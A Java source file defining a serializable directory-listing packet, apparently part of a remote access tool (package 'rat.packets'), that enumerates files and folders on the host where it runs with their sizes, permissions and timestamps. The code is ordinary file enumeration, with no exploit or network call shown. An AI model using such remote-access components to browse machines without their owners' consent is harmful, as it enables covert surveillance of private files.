package rat.packets;

import javax.swing.filechooser.FileSystemView;
import java.io.File;
import java.io.IOException;
import java.io.Serializable;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.attribute.BasicFileAttributes;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;

public class DirectoryListingPacket implements IPacket, Serializable {

    private static final long serialVersionUID = 2435194881128414459L;

    private List<DirectoryFileEntry> folders = new ArrayList<>();
    private List<DirectoryFileEntry> files = new ArrayList<>();

    private String directoryPath;
    private String slash;

    public DirectoryListingPacket(String path) {
        if (path == null) {
            this.directoryPath = FileSystemView.getFileSystemView().getRoots()[0].getAbsolutePath();
        } else {
            this.directoryPath = path;
        }
        this.slash = File.separator;
    }

    @Override
    public void execute() {
        File curDir = new File(directoryPath);

        File[] filesList;
        try {
            filesList = curDir.listFiles();
        } catch (Exception ex) {
            return;
        }

        if (filesList != null) {
            for (File f : filesList) {
                DirectoryFileEntry fileEntry = new DirectoryFileEntry(f);

                if (f.isDirectory()) {
                    folders.add(fileEntry);
                } else if (f.isFile()) {
                    files.add(fileEntry);
                }
            }
        }
    }

    public String getSlash() {
        return slash;
    }

    public String getDirectoryPath() {
        return directoryPath;
    }

    public List<DirectoryFileEntry> getFolders() {
        return folders;
    }

    public List<DirectoryFileEntry> getFiles() {
        return files;
    }

    @Override
    public PacketType getPacketType() {
        return PacketType.DIRECTORY_LISTING;
    }

    public static class DirectoryFileEntry implements Serializable, Comparable<DirectoryFileEntry> {

        private static final long serialVersionUID = -4603709842034479951L;

        private String name, type, permissions;
        private String creationTime, lastAccessTime, lastModifiedTime;
        private boolean symbolicLink, hidden;
        private long size;

        public DirectoryFileEntry(File file) {
            this.name = file.getName();
            this.type = file.isDirectory() ? "Folder" : "File";
            this.size = file.isFile() ? file.length() : -1;

            this.permissions = findPermissions(file.toPath());

            try {
                this.hidden = Files.isHidden(file.toPath());
            } catch (IOException e) {
                e.printStackTrace();
            }

            try {
                parseAttributes(Files.readAttributes(file.toPath(), BasicFileAttributes.class));
            } catch (IOException ignorable) {
                ignorable.printStackTrace();
            }
        }

        private String findPermissions(Path path) {
            Objects.requireNonNull(path);
            String permissions = "";

            if (Files.isReadable(path)) {
                permissions += "r";
            } else {
                permissions += "-";
            }

            if (Files.isWritable(path)) {
                permissions += "w";
            } else {
                permissions += "-";
            }

            if (Files.isExecutable(path)) {
                permissions += "x";
            } else {
                permissions += "-";
            }

            return permissions;
        }

        private void parseAttributes(BasicFileAttributes fileAttributes) {
            Objects.requireNonNull(fileAttributes);

            DateFormat df = new SimpleDateFormat("MM/dd/yyyy HH:mm:ss");
            this.creationTime = df.format(fileAttributes.creationTime().toMillis());
            this.lastAccessTime = df.format(fileAttributes.lastAccessTime().toMillis());
            this.lastModifiedTime = df.format(fileAttributes.lastModifiedTime().toMillis());
            this.symbolicLink = fileAttributes.isSymbolicLink();
        }

        public boolean isHidden() {
            return hidden;
        }

        public String getPermissions() {
            return permissions;
        }

        public boolean isSymbolicLink() {
            return symbolicLink;
        }

        public long getSize() {
            return size;
        }

        public String getType() {
            return type;
        }

        public String getName() {
            return name;
        }

        public String getCreationTime() {
            return creationTime;
        }

        public String getLastAccessTime() {
            return lastAccessTime;
        }

        public String getLastModifiedTime() {
            return lastModifiedTime;
        }


        @Override
        public boolean equals(Object o) {
            if (this == o) return true;
            if (o == null || getClass() != o.getClass()) return false;

            DirectoryFileEntry that = (DirectoryFileEntry) o;

            return name != null ? name.equals(that.name) : that.name == null;
        }

        @Override
        public int hashCode() {
            return name != null ? name.hashCode() : 0;
        }

        @Override
        public int compareTo(DirectoryFileEntry directoryFileEntry) {
            if ((name == null) != (directoryFileEntry.getName() == null)) {
                return (name == null) ? 1 : -1;

            } else if (name == null && directoryFileEntry.getName() == null) {
                return 0;

            } else {
                return name.compareTo(directoryFileEntry.getName());
            }
        }
    }
}
